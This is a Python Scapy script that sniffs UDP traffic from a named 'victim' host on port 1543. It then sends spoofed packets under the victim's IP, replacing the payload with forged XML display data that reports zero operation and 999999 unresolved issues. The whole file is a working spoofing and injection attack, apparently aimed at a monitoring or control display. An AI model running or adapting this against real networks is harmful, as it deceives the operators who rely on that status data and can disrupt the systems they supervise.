from scapy.all import *
import sys

victimPort = 1543
victimIP = "192.168.0.117" #the machine sending the ack, this is the default address
if len(sys.argv)>1:
        victimIP =  sys.argv[1]

# Function to handle received UDP packets
def handle_packet(packet):
    # Extract UDP and IP layers
    if(UDP in packet and IP in packet):
        udp_pkt = packet[UDP]
        ip_pkt = packet[IP]
        if  udp_pkt.dport == victimPort and ip_pkt.src == victimIP:
            #Ip layer only has the info abt where the things are supposed to go, udp layer has port stuff -- all wrapped in ip to transmit over wifi/ethernet
            if(packet.lastlayer().name =="Raw"):
                print(packet.lastlayer().load)
                modpacket = IP(dst=ip_pkt.dst, src = victimIP)/UDP(sport=udp_pkt.sport, dport=udp_pkt.dport)/Raw(load=packet.lastlayer().load[:15])/Raw(load=b'<XMLDisplayData Name="hehefakedata" Path="fakefakefake" SchemaVersion="1.1.1.2">\r\n  <Metadata>\r\n    <LastEditUser>fakefake</LastEditUser>\r\n    <LastEditTime>2024-07-01T12:36:06.345-05:00</LastEditTime>\r\n  </Metadata>\r\n  <Polygon Name="ControlPolygon">\r\n    <Height>\r\n      <Value>0000</Value>\r\n    </Height>\r\n    <Width>\r\n      <Value>0000</Value>\r\n    </Width>\r\n    <X>\r\n      <Value>0000</Value>\r\n    </X>\r\n    <Y>\r\n      <Value>0000</Value>\r\n    </Y>\r\n  </Polygon>\r\n  <OperatingPercentage>0</OperatingPercentage>\r\n  <UnresolvedIssues>999999</UnresolvedIssues>\r\n</XMLDisplayData>')
                send(modpacket)
            else:
                print("No payload")


# Start sniffing UDP packets
sniff( prn=handle_packet, lfilter=lambda pkt: pkt[Ether].src != Ether().src)
